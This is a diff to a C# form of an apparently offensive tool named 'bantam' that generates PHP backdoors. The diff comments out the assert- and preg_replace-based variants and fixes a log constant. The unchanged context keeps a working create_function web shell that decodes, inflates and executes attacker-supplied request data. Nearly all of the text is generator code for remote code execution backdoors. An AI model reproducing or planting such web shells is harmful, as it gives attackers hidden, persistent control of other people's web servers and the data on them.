@@ -25,10 +25,10 @@ namespace bantam.Forms
         public enum BackdoorTypes
         {
             EVAL = 0,
-            ASSERT,
             CREATE_FUNCTION,
             TMP_INCLUDE,
-            PREG_REPLACE
+            //ASSERT,
+            //PREG_REPLACE
         }
 
         /// <summary>
@@ -206,10 +206,10 @@ namespace bantam.Forms
                         break;
                     }
 
-                case BackdoorTypes.ASSERT: {
-                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@assert(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
-                        break;
-                    }
+                //case BackdoorTypes.ASSERT: {
+                //        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@assert(" + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n}";
+                //        break;
+                //    }
 
                 case BackdoorTypes.CREATE_FUNCTION: {
                         backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "'])" + requestEncryptionEnd + gzInflateEnd + ");\r\n\t$a();\r\n}";
@@ -221,13 +221,13 @@ namespace bantam.Forms
                         break;
                     }
 
-                case BackdoorTypes.PREG_REPLACE: {
-                        //todo this looks wrong af and doesnt support gzip
-                        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "']" + requestEncryptionEnd + gzInflateEnd + "),'.');\r\n}";
-                        break;
-                    }
+                //case BackdoorTypes.PREG_REPLACE: {
+                //        //todo this looks wrong af and doesnt support gzip
+                //        backdoorResult = "<?php \r\nif(isset($_" + requestMethod + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + requestEncryptionStart + "@base64_decode($_" + requestMethod + "['" + varName + "']" + requestEncryptionEnd + gzInflateEnd + "),'.');\r\n}";
+                //        break;
+                //    }
                 default:
-                    LogHelper.AddGlobalLog("Unknon backdoor type selection.", "GUI Error", LogHelper.LOG_LEVEL.error);
+                    LogHelper.AddGlobalLog("Unknon backdoor type selection.", "GUI Error", LogHelper.LOG_LEVEL.ERROR);
                 break;
             }
 
